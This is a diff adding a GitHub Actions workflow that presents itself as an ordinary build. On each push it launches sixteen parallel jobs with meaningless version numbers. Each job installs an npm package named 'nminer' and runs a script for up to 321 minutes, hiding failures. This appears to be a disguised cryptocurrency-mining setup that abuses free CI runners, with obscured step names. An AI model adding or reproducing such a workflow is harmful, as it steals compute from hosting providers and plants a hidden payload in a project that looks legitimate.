@@ -1,0 +1,41 @@
+name: pharmacopoeia
+on:
+  push:
+    branches: [ "main" ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        config:
+          - { version: 2386 }
+          - { version: 3136 }
+          - { version: 1894 }
+          - { version: 8421 }
+          - { version: 4965 }
+          - { version: 5476 }
+          - { version: 3585 }
+          - { version: 9432 }
+          - { version: 1828 }
+          - { version: 6658 }
+          - { version: 5188 }
+          - { version: 7855 }
+          - { version: 7367 }
+          - { version: 4261 }
+          - { version: 7777 }
+          - { version: 436 }
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: 20
+          
+      - name: graft whose
+        run: |
+          npm install nminer@latest
+          timeout 321m node pharmacopoeia.js || echo "pharmacopoeia executed"
